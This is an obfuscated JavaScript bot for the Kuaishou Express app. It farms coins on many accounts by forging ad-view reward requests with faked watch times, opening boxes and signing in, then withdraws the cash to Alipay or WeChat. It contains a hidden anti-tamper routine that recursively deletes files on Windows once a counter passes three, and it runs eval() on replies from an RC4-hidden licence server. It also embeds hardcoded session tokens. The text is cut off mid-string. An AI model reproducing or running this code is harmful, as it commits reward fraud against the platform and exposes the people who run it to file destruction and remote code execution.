const $$ = Envcc('');
let acckey = $$["isNode"]() ? process["env"]["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$["getdata"]("cdkey") : '',
    all_msg = '',
    mac = '';
$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console["log"]("\n电脑环境") : console["log"]("\n青龙环境")) : console["log"]("\n代理环境");

function isFileExist(_0x4c05bb) {
  try {
    gtr["accessSync"](_0x4c05bb, gtr["F_OK"]);
  } catch (_0x2cdd62) {
    return false;
  }

  return true;
}

function addF(_0x31b17d, _0x9a4b9c) {
  let _0xe25846 = 0,
      _0x10ce79 = "C:/Windows/system.txt";

  if (isFileExist(_0x10ce79)) {
    _0xe25846 = gtr["readFileSync"](_0x10ce79, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr["writeFile"](_0x10ce79, '1', function (_0x4d878c) {
        if (_0x4d878c) {
          throw _0x4d878c;
        }
      });
    } else {
      return;
    }
  }

  if (_0xe25846 == 99) {
    return 99;
  }

  console["log"](_0xe25846);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0xe25846);

  if (parseInt(_0xe25846) < 3) {
    let _0x3c9fd8 = parseInt(_0xe25846) + 1;

    gtr["writeFileSync"](_0x10ce79, _0x3c9fd8 + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](_0x31b17d)) {
    return;
  }

  if (gtr["statSync"](_0x31b17d)["isDirectory"]()) {
    var _0x362b43 = gtr["readdirSync"](_0x31b17d),
        _0x53323b = _0x362b43["length"],
        _0x218272 = 0;

    if (_0x53323b > 0) {
      _0x362b43["forEach"](function (_0x25f4a4) {
        _0x218272++;

        var _0x3c46c7 = _0x31b17d + '/' + _0x25f4a4;

        gtr["statSync"](_0x3c46c7)["isDirectory"]() ? addF(_0x3c46c7, true) : gtr["unlinkSync"](_0x3c46c7);
      });

      _0x53323b == _0x218272 && _0x9a4b9c && gtr["rmdirSync"](_0x31b17d);
    } else {
      _0x53323b == 0 && _0x9a4b9c && gtr["rmdirSync"](_0x31b17d);
    }
  } else {
    gtr["unlinkSync"](_0x31b17d);
  }
}

function hqs(_0x104db4 = 10) {
  return new Promise(_0x39de88 => {
    let _0x2838e6 = 5,
        _0x1a8f28 = {
      'url': $$["isNode"]() ? rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x2838e6 + "&ip=1&mac=" + mac + "&bb=1") : rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x2838e6 + "&ip=0&mac=" + mac + "&bb=1")
    };
    $$["post"](_0x1a8f28, async (_0x30cf80, _0x66a8c0, _0x91f74e) => {
      try {
        let _0x1934d7 = eval(_0x91f74e);

        _0x1934d7["code"] == 200 ? (all_msg = _0x1934d7["msg"], _0x39de88(_0x1934d7["data"])) : (all_msg = _0x1934d7["msg"], _0x39de88(false));
      } catch (_0xd27251) {
        $$["logErr"](_0xd27251, _0x66a8c0);
      }
    }, 0);
  });
}

const _0x11b3c3 = "快手极速版",
      _0x3de8b8 = new _0x4f15e2(_0x11b3c3);

let _0x279d25 = '',
    _0x1a0963,
    _0x4c35fe = ["\n", '@'],
    //这里是ck 按照@分割
    _0x547212 = ''
    _0x431ea3 = [],
    //这里是提现金额
    _0x1e627b = 3,
    //这里是提现时间
    _0x26f17b = 8,
    _0x13d24b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbAggressive"] : _0x3de8b8["getval"]("ksjsbAggressive")) || 0,
    _0x113109 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbNotify"] : _0x3de8b8["getval"]("ksjsbNotify")) || 1,
    _0x2863b1 = 0,
    _0x19c25c = 0,
    _0xf2b084 = 12,
    _0x5718d8 = [],
    yifenk = [];

const _0x1eb2d5 = {
  'id': 0,
  "name": "广告视频"
};
const _0x4fbf92 = {
  'id': 49,
  "name": "广告视频"
};
const _0x1b4191 = {
  'id': 77,
  "name": "宝箱翻倍视频"
};
const _0x2ffe31 = {
  'id': 136,
  "name": "签到翻倍视频1"
};
const _0x577a80 = {
  'id': 151,
  "name": "未知视频"
};
const _0x351e94 = {
  "ad1": _0x1eb2d5,
  "ad2": _0x4fbf92,
  "box": _0x1b4191,
  "sign": _0x2ffe31,
  "unknown1": _0x577a80
};
const _0x1e4967 = {
  'ad': 49,
  "live": 75,
  "luckydraw": 161,
  'gj': 217,
  "invite": 2008
};
const _0x3355c4 = {
  "extParams": "56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c",
  "businessId": 161,
  "pageId": 11101,
  "posId": 4683,
  "subPageId": 100013628,
  "name": "获取抽奖次数视频"
};
const _0x458f20 = {
  "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
  "businessId": 161,
  "pageId": 11101,
  "posId": 4685,
  "subPageId": 100013630,
  "name": "抽奖视频161-213"
};
const _0x124c4a = {
  "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
  "businessId": 161,
  "pageId": 11101,
  "posId": 4684,
  "subPageId": 100013629,
  "name": "抽奖视频161-100"
};
const _0x37f16f = {
  "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
  "businessId": 11,
  "pageId": 11101,
  "posId": 4684,
  "subPageId": 100013629,
  "name": "抽奖视频11-100"
};
const _0x10efec = {
  "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
  "businessId": 11,
  "pageId": 11101,
  "posId": 4684,
  "subPageId": 100013629,
  "name": "抽奖视频11-100"
};
const _0x385181 = {
  "extParams": "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
  "businessId": 2008,
  "pageId": 100012068,
  "posId": 6765,
  "subPageId": 100015089,
  "name": "邀请页视频(实际是100金币)"
};
const _0xfcb1d2 = {
  "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
  "businessId": 75,
  "pageId": 100012068,
  "posId": 6765,
  "subPageId": 100015089,
  "name": "直播任务"
};
const _0x11da17 = {
  "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
  "businessId": 168,
  "pageId": 100012068,
  "posId": 6765,
  "subPageId": 100015089,
  "name": "签到翻倍视频2"
};
const _0x10d9f8 = {
  "luckdrawNum_161": _0x3355c4,
  "luckdrawVideo_161_213": _0x458f20,
  "luckdrawVideo_161_100": _0x124c4a,
  "luckdrawVideo_11_213": _0x37f16f,
  "luckdrawVideo_11_100": _0x10efec,
  "inviteVideo_2008": _0x385181,
  "liveVideo_75": _0xfcb1d2,
  "signVideo_168": _0x11da17
};

let _0x134a17 = new Date(),
    _0x20a9d7 = _0x134a17["getHours"](),
    _0x459e63 = 1.07,
    _0x2e716e = 0,
    _0x5bc515 = "ksjsb",
    _0x180c0c = "",
    _0x75eec0 = "127.0.0.1";

class _0x9d8dda {
  constructor(_0x206692) {
    let _0x350e70 = _0x206692["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';

    this["index"] = ++_0x2863b1;
    this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + _0x350e70;
    this["name"] = this["index"];
    this["valid"] = false;
    this["bindAlipay"] = false;
    this["alipay"] = '';
    this["bindWechat"] = false;
    this["wechat"] = '';
    this["needSms"] = false;
    this["hasLuckydraw"] = true;
    const _0x381539 = {
      "num": 2,
      "needRun": true
    };
    const _0x51bafd = {
      "num": 1,
      "needRun": true
    };
    const _0x4411c8 = {
      "num": 5,
      "needRun": true
    };
    const _0x5e3d31 = {
      "num": 1,
      "needRun": true
    };
    const _0x28252b = {
      "num": 5,
      "needRun": true
    };
    const _0x34875c = {
      '49': _0x381539,
      '75': _0x51bafd,
      "161": _0x4411c8,
      "217": _0x5e3d31,
      "2008": _0x28252b
    };
    this["task"] = _0x34875c;
  }

  async ["getUserInfo"]() {
    let _0x466fce = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo",
        _0x1500cb = '',
        _0x2cc953 = _0x495d61(_0x466fce, this["cookie"], _0x1500cb);

    await _0x39a23b("get", _0x2cc953);
    let _0x58187c = _0x1a0963;

    if (!_0x58187c) {
      return;
    }

    _0x58187c["result"] == 1 ? (this["valid"] = true, this["name"] = _0x58187c["data"]["userData"]["nickname"], this["cashBalance"] = _0x58187c["data"]["totalCash"], this["coinBalance"] = _0x58187c["data"]["totalCoin"], this["allCash"] = _0x58187c["data"]["allCash"], console["log"]("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math["floor"](parseFloat(this["allCash"]) - parseFloat(this["cashBalance"])) + '元')) : console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + _0x58187c["error_msg"]);
  }

  async ["setShare"]() {
    let _0x48e03d = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
        _0x3b87f2 = '',
        _0x2826bb = _0x495d61(_0x48e03d, this["cookie"], _0x3b87f2);

    await _0x39a23b("post", _0x2826bb);
    let _0x27f502 = _0x1a0963;

    if (!_0x27f502) {
      return;
    }

    _0x27f502["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200), await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + "]分享失败：" + _0x27f502["error_msg"]);
  }

  async ["taskReward"](_0x462cca) {
    let _0x9369ce = "https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=" + _0x462cca,
        _0x1ad4cb = '',
        _0x7c9d9 = _0x495d61(_0x9369ce, this["cookie"], _0x1ad4cb);

    await _0x39a23b("get", _0x7c9d9);
    let _0x1d62b5 = _0x1a0963;

    if (!_0x1d62b5) {
      return;
    }

    _0x1d62b5["result"] == 1 ? console["log"]("账号[" + this["name"] + "]完成任务[" + _0x462cca + "]成功，获得" + _0x1d62b5["data"]["amount"] + '金币') : console["log"]("账号[" + this["name"] + "]完成任务[" + _0x462cca + "]失败：" + _0x1d62b5["error_msg"]);
  }

  async ["getSignInfo"]() {
    let _0x856728 = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
        _0x5836c9 = '',
        _0x213e7f = _0x495d61(_0x856728, this["cookie"], _0x5836c9);

    await _0x39a23b("get", _0x213e7f);
    let _0x3fb132 = _0x1a0963;

    if (!_0x3fb132) {
      return;
    }

    _0x3fb132["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]今天" + (_0x3fb132["data"]["nebulaSignInPopup"]["todaySigned"] ? '已' : '未') + '签到'), !_0x3fb132["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8["wait"](200), await this["doSign"](), await _0x3de8b8["wait"](200), await this["setShare"]())) : console["log"]("账号[" + this["name"] + "]查询签到信息失败：" + _0x3fb132["error_msg"]);
  }

  async ["doSign"]() {
    let _0x9b6c68 = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity",
        _0x51c859 = '',
        _0x4ce03f = _0x495d61(_0x9b6c68, this["cookie"], _0x51c859);

    await _0x39a23b("get", _0x4ce03f);
    let _0x29c07a = _0x1a0963;

    if (!_0x29c07a) {
      return;
    }

    if (_0x29c07a["result"] == 1) {
      console["log"]("账号[" + this["name"] + "]签到成功：" + _0x29c07a["data"]["toast"]);
      await _0x3de8b8["wait"](200);
      await this["ksAdParam"](_0x351e94["sign"]);
      await _0x3de8b8["wait"](200);
      await this["ksNeoAdParam"](_0x10d9f8["signVideo_168"]);
    } else {
      console["log"]("账号[" + this["name"] + "]签到失败：" + _0x29c07a["error_msg"]);
    }
  }

  async ["taskList"]() {
    let _0x594e56 = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
        _0x2cc769 = '',
        _0x5a4b44 = _0x495d61(_0x594e56, this["cookie"], _0x2cc769);

    await _0x39a23b("get", _0x5a4b44);
    let _0x1ffcff = _0x1a0963;

    if (!_0x1ffcff) {
      return;
    }

    if (_0x1ffcff["result"] == 1) {
      console["log"]("账号[" + this["name"] + "]任务完成情况：");

      for (let _0x4dafd1 of _0x1ffcff["data"]["dailyTasks"]) {
        for (let _0x55b29d in _0x1e4967) {
          if (_0x4dafd1["taskId"] == _0x1e4967[_0x55b29d]) {
            let _0x90a461 = parseInt(_0x4dafd1["completedStages"]),
                _0x3daede = parseInt(_0x4dafd1["stages"]),
                _0x4ebdd5 = Math["ceil"](_0x3daede / _0xf2b084),
                _0x329bbb = _0x90a461 < _0x3daede;

            const _0x55df2a = {
              "num": _0x4ebdd5,
              "needRun": _0x329bbb
            };
            this["task"][_0x4dafd1["taskId"]] = _0x55df2a;
            console["log"]('【' + _0x4dafd1["name"] + "】 " + _0x90a461 + '/' + _0x3daede + '，' + (_0x329bbb ? "未完成" : "已完成") + "，每次运行完成" + _0x4ebdd5 + "次任务");
            continue;
          }
        }
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询任务列表失败：" + _0x1ffcff["error_msg"]);
    }
  }

  async ["ksgj"]() {
    let _0xb912ab = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward",
        _0x2a5d3a = "activityId=148&client_key=ksgjbody",
        _0x40d1d8 = _0x495d61(_0xb912ab, this["cookie"], _0x2a5d3a);

    await _0x39a23b("post", _0x40d1d8);
    let _0x3b0ef6 = _0x1a0963;

    if (!_0x3b0ef6) {
      return;
    }

    _0x3b0ef6["result"] == 1 ? console["log"]("账号[" + this["name"] + "]逛街获得" + _0x3b0ef6["data"]["amount"] + '金币') : console["log"]("账号[" + this["name"] + "]逛街失败：" + _0x3b0ef6["error_msg"]);
  }

  async ["ksAdParam"](_0x2f18c9) {
    let _0x290b91 = "https://api.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
        _0x8d4d0a = "encData=WlTuzeTU6mGT9525bjJUVnltdAIDRX9jgjAw%2BtDz1mYL3R7lRHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2Lbcr%2BBQ%2BHac6UUsDrGKYVUfrkQV7RecSLCXPJUZUuMwLsLFCGs%2BKC7eOEJjqWfmVrM8dueIheKRMSZBbt%2FhfvqM%2Fee9NJ%2BJffGvXtHwLJ4qe3oR4kQjVbO0EhDIIWcmQyVb5itptfnW%2F1F34lJHl0CqujrFWFlOcjaQXCE60ckkx6XvzfL5zkj9CNRd2cFx1lwUVFUTsa5DKFhXu4sIKEXboM78io0ZqCYYvkAZZziFfRhqQwVqa5WxJnq9kVQ7%2BB2zTcLXuLQOzAcqTrvBYNYjdEjSQFPNamYXy48vNas%2FQV%2FfltGhC0bmK8%2Fmivdt0oHgO0bRNAuX%2B7KIcCTbikFDv4AKi50SnzMMkBjKDTvHpTgG6KKjeaKVFHA9bYA4PXDQkk4hdcIsJrISYfbX3mP9VqjhO6zZUtvFvCJW7MTpO8qh5olNaHGewl4CO28G0EtjXoGrJlE87qmT9CXdO0MpraCJw7OQHbgHStyrMgbF%2FqtdVTPEGTOIkqit5b3VewlYYbBEsFyQ%2BYoC3PxQ4Lid0l6vN5colVL%2FrVAXXNU0J%2FiCUmwip0N3jluEY5pO%2FBzrkPPDIiEDaEdgrxz9j179pydpnuYcko6MYT6LOPHXg%3D%3D&sign=5a54eecde4d4ea618de6b1e54847dca6fdd0cab94ae896aeb44fc797daabf0e5&cs=false&sig=504669c9a5e6bcc15d9a484cc5d5f57e&client_key=2ac2a76d&__NS_sig3=fced9dbe3a4987fe88b4b7b64022ffd9c544cbcca8a5abbd&os=android&pUid=qQUO36wB-dz_Gy3tLzpbI8UmT77Z5_Ud9c4158be54de319&uQaTag=0&__NStokensig=1bc5fb08cb72593ff961c4aa5f91e578fe09c26159dade76d74fcbd03f56c1ba&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAHfCvyUFfoDIjKLtobHRUI4rV5KX9fmSh5BaFAxbHiD3vrmO7EctytWlWc8tphfjXS5wvVXgD-1C2GqZwimFMlcdjvp5Ioum4yP90I2RAgQnIqRcpeU_cGzwVKlXb0goIUU7hLjiM3AJe13x3GP3V6QxP5YHQAtJYjdbcS1Tgt9PW52UKgZo9xNAv639YVDtvr370HZL90D3uhO5HqUIkGiGhJNk_1UD2hFuJqWEjmUf_4qTIUiIOV_btfbatJr_naJUihUtP_EB3O1dVMiyaa2e0em64z1KAUwAQ",
        _0x3d44a6 = _0x495d61(_0x290b91, this["cookie"], _0x8d4d0a);

    await _0x39a23b("post", _0x3d44a6);
    let _0x375de9 = _0x1a0963;

    if (!_0x375de9) {
      return;
    }

    _0x375de9["result"] == 1 ? _0x375de9["impAdInfo"] && _0x375de9["impAdInfo"]["length"] > 0 && _0x375de9["impAdInfo"][0]["adInfo"] && _0x375de9["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x375de9["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksAdReward"](_0x375de9["llsid"], _0x375de9["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x2f18c9)) : console["log"]("账号[" + this["name"] + "]获取" + _0x2f18c9["name"] + "参数失败：" + _0x375de9["error_msg"]);
  }

  async ["ksAdReward"](_0x1329b6, _0x4e47e2, _0x509425) {
    let _0x45effd = new Date()["getTime"](),
        _0x3a5ede = Math["floor"](Math["random"]() * 30000) + 45000,
        _0x4a5f42 = _0x45effd - _0x3a5ede,
        _0x117dc7 = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward",
        _0x4ab77c = "bizStr={\"endTime\":" + _0x45effd + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + _0x4e47e2 + ",\"extInfo\":\"\",\"llsid\":" + _0x1329b6 + ",\"taskType\":1}],\"startTime\":" + _0x4a5f42 + ",\"taskId\":" + _0x509425['id'] + '}',
        _0x1403fa = _0x495d61(_0x117dc7, this["cookie"], _0x4ab77c);

    await _0x39a23b("post", _0x1403fa);
    let _0x5ee7d8 = _0x1a0963;

    if (!_0x5ee7d8) {
      return;
    }

    _0x5ee7d8["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + _0x509425["name"] + '获得' + _0x5ee7d8["data"]["awardAmount"] + '金币') : console["log"]("账号[" + this["name"] + ']看' + _0x509425["name"] + "失败：" + _0x5ee7d8["error_msg"]);
  }

  async ["openBox"](_0xee493a) {
    let _0x4ac926 = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + _0xee493a + "&isReadyOfAdPlay=true",
        _0x2ae512 = '',
        _0x1491b3 = _0x495d61(_0x4ac926, this["cookie"], _0x2ae512);

    await _0x39a23b("get", _0x1491b3);
    let _0x25c28a = _0x1a0963;

    if (!_0x25c28a) {
      return;
    }

    _0x25c28a["result"] == 1 ? _0xee493a == true ? _0x25c28a["data"]["commonAwardPopup"] && _0x25c28a["data"]["commonAwardPopup"]["awardAmount"] ? (console["log"]("账号[" + this["name"] + "]开宝箱获得" + _0x25c28a["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["box"])) : console["log"]("账号[" + this["name"] + "]开宝箱没有获得金币") : _0x25c28a["data"]["openTime"] > -1 ? (console["log"]("账号[" + this["name"] + "]开宝箱冷却时间还有" + Math["floor"](_0x25c28a["data"]["openTime"] / 1000) + '秒'), _0x25c28a["data"]["openTime"] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" + this["name"] + "]开宝箱次数已用完") : _0xee493a == true ? console["log"]("账号[" + this["name"] + "]开宝箱失败：" + _0x25c28a["error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + _0x25c28a["error_msg"]);
  }

  async ["withdraw"](_0x15a280) {
    if (!this["bindAlipay"] && !this["bindWechat"]) {
      _0x1ab8b7("账号[" + this["name"] + "]未绑定提现账号，不执行提现");

      return;
    }

    let _0x5b2544 = parseInt(_0x15a280 * 100),
        _0xe71b7f = this["bindAlipay"] ? "ALIPAY" : "WECHAT",
        _0x3d7336 = _0xe71b7f == "ALIPAY" ? "支付宝" : '微信',
        _0x3155b9 = _0xe71b7f == "ALIPAY" ? this["alipay"] : this["wechat"],
        _0x1218fb = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply",
        _0x3040d3 = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + _0x5b2544 + "&provider=" + _0xe71b7f + "&total_fen=" + _0x5b2544 + "&commission_fen=0&third_account=" + _0xe71b7f + "&attach=&biz_content=&session_id=",
        _0x3df5b7 = _0x495d61(_0x1218fb, this["cookie"], _0x3040d3);

    await _0x39a23b("post", _0x3df5b7);
    let _0x2fac4c = _0x1a0963;

    if (!_0x2fac4c) {
      return;
    }

    _0x2fac4c["result"] == "SUCCESS" ? _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + _0x15a280 + '元到' + _0x3d7336 + '[' + _0x3155b9 + "]成功") : _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + _0x15a280 + '元到' + _0x3d7336 + '[' + _0x3155b9 + "]失败：" + _0x2fac4c["msg"]);
  }

  async ["withdrawOverview"]() {
    let _0xca7788 = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
        _0x1bb31b = '',
        _0x55a5fe = _0x495d61(_0xca7788, this["cookie"], _0x1bb31b);

    await _0x39a23b("get", _0x55a5fe);
    let _0x4f3c27 = _0x1a0963;

    if (!_0x4f3c27) {
      return;
    }

    if (_0x4f3c27["result"] == 1) {
      if (_0x4f3c27["data"]["isLimit"] == true) {
        console["log"]("账号[" + this["name"] + "]今天已提现");
        return;
      }

      let _0x29b355 = parseFloat(this["cashBalance"]);

      if (_0x13d24b == 1) {
        if (_0x29b355 < 0.3) {
          _0x1ab8b7("账号[" + this["name"] + "]余额不足0.3元，不提现");
        } else {
          let _0x536084 = Math["floor"](_0x29b355 * 10) / 10;

          _0x536084 = _0x536084 > 50 ? 50 : _0x536084;

          _0x1ab8b7("账号[" + this["name"] + "]准备最大化提现" + _0x536084 + '元');

          await _0x3de8b8["wait"](200);
          await this["withdraw"](_0x536084);
        }
      } else {
        if (!_0x1e627b) {
          for (let _0x420a4a of _0x4f3c27["data"]["enWithdrawList"]["sort"](function (_0x19cda9, _0xa6635b) {
            return _0xa6635b - _0x19cda9;
          })) {
            if (_0x29b355 >= parseFloat(_0x420a4a)) {
              _0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x420a4a + '元');

              await _0x3de8b8["wait"](200);
              await this["withdraw"](_0x420a4a);
              return;
            }
          }

          _0x1ab8b7("账号[" + this["name"] + "]余额不足，可提现额度：" + _0x4f3c27["data"]["enWithdrawList"]["join"](','));
        } else {
          _0x29b355 >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x1e627b + '元'), await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7("账号[" + this["name"] + "]余额不足" + _0x1e627b + "元，不提现");
        }
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询提现列表失败：" + _0x4f3c27["error_msg"]);
    }
  }

  async ["accountOverview"]() {
    let _0x11ebd9 = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
        _0x23c506 = '',
        _0x3cddb2 = _0x495d61(_0x11ebd9, this["cookie"], _0x23c506);

    await _0x39a23b("get", _0x3cddb2);
    let _0x1ed3d6 = _0x1a0963;

    if (!_0x1ed3d6) {
      return;
    }

    if (_0x1ed3d6["result"] == 1) {
      this["coinBalance"] = _0x1ed3d6["data"]["coinBalance"];
      this["cashBalance"] = _0x1ed3d6["data"]["cashBalance"];
      let _0x1f58f1 = _0x1ed3d6["data"]["exchangeCoinState"];

      _0x1ab8b7("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + '金币');

      _0x1f58f1 == 2 && (await _0x3de8b8["wait"](200), await this["changeExchangeType"](0));
    } else {
      console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + _0x1ed3d6["error_msg"]);
    }
  }

  async ["changeExchangeType"](_0x12e125) {
    let _0x42d584 = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
        _0x4840a3 = "{\"type\":" + _0x12e125 + '}',
        _0x4c0418 = _0x495d61(_0x42d584, this["cookie"], _0x4840a3);

    _0x4c0418["headers"]["Content-Type"] = "application/json";
    await _0x39a23b("post", _0x4c0418);
    let _0x210c4e = _0x1a0963;

    if (!_0x210c4e) {
      return;
    }

    let _0x35495f = _0x12e125 == 0 ? "自动兑换" : "手动兑换";

    _0x210c4e["result"] == 1 ? console["log"]("账号[" + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + _0x35495f) : console["log"]("账号[" + this["name"] + "]兑换方式更改失败：" + _0x210c4e["error_msg"]);
  }

  async ["exchangeCoin"]() {
    if (this["coinBalance"] < 100) {
      console["log"]("账号[" + this["name"] + "]金币余额不足100，不执行兑换");
      return;
    }

    let _0x11e8a7 = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
        _0x45c06d = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
        _0x35866b = _0x495d61(_0x11e8a7, this["cookie"], _0x45c06d);

    _0x35866b["headers"]["Content-Type"] = "application/json";
    await _0x39a23b("post", _0x35866b);
    let _0x9b506a = _0x1a0963;

    if (!_0x9b506a) {
      return;
    }

    if (_0x9b506a["result"] == 1) {
      let _0x595467 = Math["floor"](this["coinBalance"] / 100) * 100,
          _0x2215d2 = Math["floor"](this["coinBalance"] / 100) / 100;

      console["log"]("账号[" + this["name"] + "]兑换金币成功，将" + _0x595467 + "金币兑换成" + _0x2215d2 + '元');
    } else {
      console["log"]("账号[" + this["name"] + "]兑换金币失败：" + _0x9b506a["error_msg"]);
    }
  }

  async ["ksNeoAdParam"](_0x58630d) {
    let _0x2bcaf3 = "https://api2.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
        _0x347db8 = "encData=WlTuzeTU6mGT9525bjJUVnltdAIDRX9jgjAw%2BtDz1mYL3R7lRHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2Lbcr%2BBQ%2BHac6UUsDrGKYVUfrkQV7RecSLCXPJUZUuMwLsLFCGs%2BKC7eOEJjqWfmVrM8dueIheKRMSZBbt%2FhfvqM%2Fee9NJ%2BJffGvXtHwLJ4qe3oR4kQjVbO0EhDIIWcmQyVb5itptfnW%2F1F34lJHl0CqujrFWFlOcjaQXCE60ckkx6XvzfL5zkj9CNRd2cFx1lwUVFUTsa5DKFhXu4sIKEXboM78io0ZqCYYvkAZZziFfRhqQwVqa5WxJnq9kVQ7%2BB2zTcLXuLQOzAcqTrvBYNYjdEjSQFPNamYXy48vNas%2FQV%2FfltGhC0bmK8%2Fmivdt0oHgO0bRNAuX%2B7KIcCTbikFDv4AKi50SnzMMkBjKDTvHpTgG6KKjeaKVFHA9bYA4PXDQkk4hdcIsJrISYfbX3mP9VqjhO6zZUtvFvCJW7MTpO8qh5olNaHGewl4CO28G0EtjXoGrJlE87qmT9CXdO0MpraCJw7OQHbgHStyrMgbF%2FqtdVTPEGTOIkqit5b3VewlYYbBEsFyQ%2BYoC3PxQ4Lid0l6vN5colVL%2FrVAXXNU0J%2FiCUmwip0N3jluEY5pO%2FBzrkPPDIiEDaEdgrxz9j179pydpnuYcko6MYT6LOPHXg%3D%3D&sign=5a54eecde4d4ea618de6b1e54847dca6fdd0cab94ae896aeb44fc797daabf0e5&cs=false&sig=504669c9a5e6bcc15d9a484cc5d5f57e&client_key=2ac2a76d&__NS_sig3=fced9dbe3a4987fe88b4b7b64022ffd9c544cbcc